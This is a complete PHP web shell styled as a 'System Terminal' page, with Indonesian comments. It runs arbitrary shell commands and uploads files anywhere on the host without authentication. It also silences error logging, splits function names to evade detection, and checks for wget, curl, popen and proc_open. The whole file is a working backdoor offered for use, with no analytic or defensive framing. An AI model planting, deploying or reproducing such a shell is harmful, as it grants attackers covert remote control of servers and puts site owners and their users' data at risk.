<?php
@ini_set('log_errors', 0);
@ini_set('display_errors', 1);
@error_reporting(E_ALL);
while(@ob_end_clean());

$f = 'move' . '_uploaded_' . 'file';
$g = 'get' . 'cwd';
$d = empty($_POST['x1']) ? '' : $_POST['x1'];
$w = empty($_POST['x2']) ? $g() : $_POST['x2'];
$u = $_SERVER['REQUEST_URI'];
$s = '';

// --- FUNGSI TAMBAHAN UNTUK CEK COMMAND/VERSION ---
function get_cmd_version($cmd) {
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . ' --version 2>&1');
        if ($result === null || $result === false) {
            return '<span class="status-bad">✖ Disabled</span>';
        }

        $lines = explode("\n", trim($result));
        if (empty($lines[0])) {
             return '<span class="status-bad">✖ Not Found</span>';
        }
        
        $version = '';
        foreach ($lines as $line) {
            $line = trim($line);
            if (stripos($line, 'version') !== false) {
                $version = htmlspecialchars(substr($line, 0, 40)) . '...';
                break;
            }
        }
        return '<span class="status-good">✔ ' . ($version ?: 'Available') . '</span>';
    } else {
        return '<span class="status-bad">✖ shell_exec Disabled</span>';
    }
}

$os = php_uname('s') . ' ' . php_uname('r');
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$wget_info = get_cmd_version('wget');
$curl_info = get_cmd_version('curl');
$popen_status = function_exists('popen') ? '<span class="status-good">✔ Available</span>' : '<span class="status-bad">✖ Disabled</span>';
$proc_open_status = function_exists('proc_open') ? '<span class="status-good">✔ Available</span>' : '<span class="status-bad">✖ Disabled</span>';

if (isset($_FILES['f1']) && $_FILES['f1']['error'] === UPLOAD_ERR_OK) {
  $t = $w . '/' . basename($_FILES['f1']['name']);
  if ($f($_FILES['f1']['tmp_name'], $t)) {
    $s .= "<span class='text-success'>[+] Uploaded: " . htmlspecialchars($t) . " (" . $_FILES['f1']['size'] . " bytes)</span>\n";
  }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Terminal</title>
    <style>
        :root {
            --bg: #090a0a;
            --panel: #111413;
            --border: #1f2a26;
            --text: #a0b0a8;
            --accent: #00ffcc;
            --accent-dim: #005f4c;
            --success: #39ff14;
            --danger: #ff073a;
            --font: 'Courier New', Courier, monospace;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: var(--font);
            font-size: 13px;
            line-height: 1.5;
            padding: 20px;
            min-height: 100vh;
            background-image: linear-gradient(rgba(0, 255, 204, 0.03) 1px, transparent 1px);
            background-size: 100% 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        
        /* Header & Status Grid */
        .header {
            border: 1px solid var(--border);
            border-left: 3px solid var(--accent);
            background: var(--panel);
            padding: 15px;
            margin-bottom: 20px;
        }
        .header-title {
            color: var(--accent);
            font-size: 16px;
            font-weight: bold;
            letter-spacing: 1px;
            margin-bottom: 10px;
            border-bottom: 1px solid var(--border);
            padding-bottom: 5px;
        }
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }
        .status-item {
            display: flex;
            justify-content: space-between;
            padding: 4px 8px;
            background: rgba(0,0,0,0.3);
            border-radius: 3px;
        }
        .status-label { color: #6b7a76; }
        .status-good { color: var(--success); font-weight: bold; }
        .status-bad { color: var(--danger); font-weight: bold; }

        /* Form Elements */
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            color: var(--accent);
            margin-bottom: 5px;
            font-size: 12px;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            background: var(--bg);
            border: 1px solid var(--border);
            color: var(--text);
            font-family: var(--font);
            outline: none;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus {
            border-color: var(--accent);
            box-shadow: 0 0 8px rgba(0, 255, 204, 0.1);
        }
        
        /* File Upload Custom */
        .file-upload-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--bg);
            border: 1px dashed var(--border);
            padding: 10px;
            margin-bottom: 15px;
        }
        input[type="file"] {
            color: var(--text);
            font-family: var(--font);
        }
        input[type="file"]::file-selector-button {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent);
            padding: 5px 10px;
            cursor: pointer;
            margin-right: 10px;
            font-family: var(--font);
        }
        input[type="file"]::file-selector-button:hover {
            background: var(--accent);
            color: #000;
        }

        /* Button */
        button[type="submit"] {
            background: transparent;
            border: 1px solid var(--accent);
            color: var(--accent);
            padding: 10px 20px;
            font-family: var(--font);
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }
        button[type="submit"]:hover {
            background: var(--accent);
            color: #000;
            box-shadow: 0 0 10px rgba(0,255,204,0.4);
        }

        /* Output Terminal */
        .terminal-output {
            background: var(--panel);
            border: 1px solid var(--border);
            padding: 15px;
            margin-top: 20px;
            min-height: 150px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .terminal-output::-webkit-scrollbar { width: 6px; }
        .terminal-output::-webkit-scrollbar-track { background: var(--bg); }
        .terminal-output::-webkit-scrollbar-thumb { background: var(--accent-dim); }
        .text-success { color: var(--success); }
        .text-error { color: var(--danger); }
    </style>
</head>
<body>

<div class="container">
    <!-- SYSTEM INFO -->
    <div class="header">
        <div class="header-title">>_ SYSTEM INFO</div>
        <div class="status-grid">
            <div class="status-item"><span class="status-label">OS:</span> <span><?= htmlspecialchars($os) ?></span></div>
            <div class="status-item"><span class="status-label">IP:</span> <span><?= htmlspecialchars($server_ip) ?></span></div>
            <div class="status-item"><span class="status-label">Wget:</span> <?= $wget_info ?></div>
            <div class="status-item"><span class="status-label">Curl:</span> <?= $curl_info ?></div>
            <div class="status-item"><span class="status-label">popen:</span> <?= $popen_status ?></div>
            <div class="status-item"><span class="status-label">proc_open:</span> <?= $proc_open_status ?></div>
        </div>
    </div>

    <!-- FORM CONTROL -->
    <form method="post" action="<?php echo $u; ?>" enctype="multipart/form-data">
        <div class="form-group">
            <label>📁 CURRENT DIRECTORY (Press Enter to change)</label>
            <input type="text" name="x2" value="<?php echo htmlspecialchars($w); ?>">
        </div>

        <div class="file-upload-wrapper">
            <span>📤 UPLOAD FILE:</span>
            <input type="file" name="f1">
        </div>

        <div class="form-group">
            <label>>_ COMMAND INPUT</label>
            <input type="text" name="x1" value="<?php echo htmlspecialchars($d); ?>" placeholder="e.g. ls -lah" autocomplete="off">
        </div>

        <button type="submit">▶ EXECUTE</button>
    </form>

    <!-- OUTPUT -->
    <?php if (!empty($s) || !empty($d)): ?>
    <div class="terminal-output">
        <?php
        echo $s;
        if (!empty($d)) {
          $full_cmd = (DIRECTORY_SEPARATOR === '/' ? 'exec 2>&1; ' : 'cmd /C "') . $d . (DIRECTORY_SEPARATOR !== '/' ? '"' : '');
          
          if (function_exists('proc_open')) {
              echo "<span class='text-success'>[~] Executing (proc_open): " . htmlspecialchars($d) . "</span>\n";
              $descriptorspec = array(
                  0 => array("pipe", "r"),
                  1 => array("pipe", "w"),
                  2 => array("pipe", "w")
              );
              $process = @proc_open($full_cmd, $descriptorspec, $pipes);
              if (is_resource($process)) {
                  echo htmlspecialchars(@stream_get_contents($pipes[1]));
                  echo htmlspecialchars(@stream_get_contents($pipes[2]));
                  @fclose($pipes[0]);
                  @fclose($pipes[1]);
                  @fclose($pipes[2]);
                  @proc_close($process);
              } else {
                  echo "<span class='text-error'>[-] Failed to execute via proc_open</span>\n";
              }
          } elseif (function_exists('popen')) {
              echo "<span class='text-success'>[~] Executing (popen): " . htmlspecialchars($d) . "</span>\n";
              $p = @popen($full_cmd, 'r');
              if ($p) {
                  while (!feof($p)) echo htmlspecialchars(@fread($p, 4096));
                  @pclose($p);
              } else {
                  echo "<span class='text-error'>[-] Failed to execute via popen</span>\n";
              }
          } else {
              echo "<span class='text-error'>[-] Both popen and proc_open are disabled!</span>\n";
          }
        }
        ?>
    </div>
    <?php endif; ?>
</div>

</body>
</html>
